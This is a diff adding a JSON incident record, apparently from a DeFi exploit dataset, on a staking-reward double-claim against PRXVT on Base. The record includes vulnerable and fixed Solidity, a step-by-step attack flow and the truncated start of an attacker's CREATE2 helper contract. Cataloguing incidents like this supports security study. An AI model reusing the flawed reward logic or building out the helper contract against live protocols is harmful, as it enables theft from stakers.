@@ -1,0 +1,34 @@
+{
+ "id": "2026__2026-01-01_PRXVT_StakingRewardFlaw",
+ "source_file": "2026/2026-01-01_PRXVT_StakingRewardFlaw.md",
+ "title": "PRXVT — Staking Reward Double-Claim via CREATE2 Helper Analysis",
+ "date": "2026-01-01",
+ "protocol": "PRXVT",
+ "chain": "Base",
+ "loss_raw": "32.8 ETH",
+ "loss_usd": null,
+ "root_cause": "Transferring stPRXVT to CREATE2-deployed helper contracts causes each helper to be recognized as a new staker, enabling independent reward claims",
+ "attack_tx": "0xf42a8fe556d5e4ab59b0b7675ccbcd1425e7e2a6a8e0c9775fc6cd7c48ff55a1",
+ "vulnerable_contract": "0xdac30a5e2612206e2756836ed6764ec5817e6fff (stPRXVT)",
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable: no double-claim prevention logic in reward claiming\ncontract PRXVTStaking {\n    mapping(address => uint256) public staked;        // staked amount\n    mapping(address => uint256) public rewardDebt;    // reward debt\n    mapping(address => uint256) public lastClaimBlock; // last claim block\n\n    // ❌ After stPRXVT transfer, the original staker's rewardDebt is not reset\n    function stake(uint256 amount) external {\n        stPRXVT.transferFrom(msg.sender, address(this), amount);\n        staked[msg.sender] += amount;\n        // ❌ No rewardDebt reset → rewards remain claimable even after transfer\n    }\n\n    function claimReward() external {\n        uint256 reward = _calculateReward(msg.sender);\n        // ❌ Even after transferring stPRXVT to another address,\n        //    the original address still has staked record and can claim rewards\n        rewardToken.transfer(msg.sender, reward);\n        lastClaimBlock[msg.sender] = block.number;\n    }\n\n    // ❌ Reward calculated based on stPRXVT balance (original record persists even after transfer)\n    function _calculateReward(address user) internal view returns (uint256) {\n        return staked[user] * rewardRate * (block.number - lastClaimBlock[user]);\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: settle rewards on stake/unstake + restrict transfers\ncontract PRXVTStaking {\n    mapping(address => uint256) public staked;\n    mapping(address => uint256) public pendingReward;\n    mapping(address => uint256) public rewardPerTokenPaid;\n    uint256 public rewardPerTokenStored;\n\n    // ✅ Settle accrued rewards before staking\n    function stake(uint256 amount) external updateReward(msg.sender) {\n        stPRXVT.transferFrom(msg.sender, address(this), amount);\n        staked[msg.sender] += amount;\n    }\n\n    // ✅ Settle rewards immediately on stPRXVT transfer (unstake)\n    function unstake(uint256 amount) external updateReward(msg.sender) {\n        staked[msg.sender] -= amount;\n        stPRXVT.transfer(msg.sender, amount);\n    }\n\n    function claimReward() external updateReward(msg.sender) {\n        uint256 reward = pendingReward[msg.sender];\n        pendingReward[msg.sender] = 0;\n        rewardToken.transfer(msg.sender, reward);\n    }\n\n    // ✅ Block stPRXVT transfers to contract addresses\n    function _beforeTokenTransfer(address from, address to, uint256) internal override {\n        require(!_isContract(to) || to == address(this), \"Cannot transfer to contract\");\n    }\n\n    modifier updateReward(address user) {\n        rewardPerTokenStored = rewardPerToken();\n        if (user != address(0)) {\n            pendingReward[user] = earned(user);\n            rewardPerTokenPaid[user] = rewardPerTokenStored;\n        }\n        _;\n    }\n}"
+ ],
+ "steps": [
+  "[1] Stake PRXVT → receive stPRXVT",
+  "→ Helper1 receives rewards",
+  "Helper1 → Attacker",
+  "⚠️ attacker.staked = N record persists → same rewards claimed again!",
+  "→ Attacker also receives same rewards",
+  "Number of helpers = K → rewards multiplied K+1 times"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1] Stake PRXVT → receive stPRXVT\n  │       staking.stake(N)\n  │       attacker.staked = N\n  │       attacker.lastClaimBlock = block.number\n  │\n  ├─[2] Deploy Helper Contract 1 via CREATE2\n  │       Helper1 = new HelperContract{salt: 0x01}()\n  │\n  ├─[3] Transfer stPRXVT to Helper1\n  │       stPRXVT.transfer(Helper1, N)\n  │       ⚠️  attacker.staked = N (record preserved!)\n  │       Helper1 balance: stPRXVT = N\n  │\n  ├─[4] Call Helper1.claimReward()\n  │       Helper1 claims rewards for N stPRXVT\n  │       → Helper1 receives rewards\n  │\n  ├─[5] Return stPRXVT to attacker\n  │       Helper1 → Attacker\n  │\n  ├─[6] Call attacker.claimReward()\n  │       ⚠️  attacker.staked = N record persists → same rewards claimed again!\n  │       → Attacker also receives same rewards\n  │\n  ├─[7",
+  "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IPRXVTStaking {\n    function claimReward() external;\n    function stake(uint256 amount) external;\n}\n\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\n// Helper contract deployed via CREATE2\ncontract StakingHelper {\n    address owner;\n    IPRXVTStaking staking;\n    IERC20 stPRXVT;\n\n    constructor(address _staking, address _stPRXVT) {\n        owner = msg.sender;\n        staking = IPRXVTStaking(_staking);\n        stPRXVT = IERC20(_stPRXVT);\n    }\n\n    // Receive stPRXVT, claim rewards, then return tokens\n    function claimAndRetu"
+ ]
+}
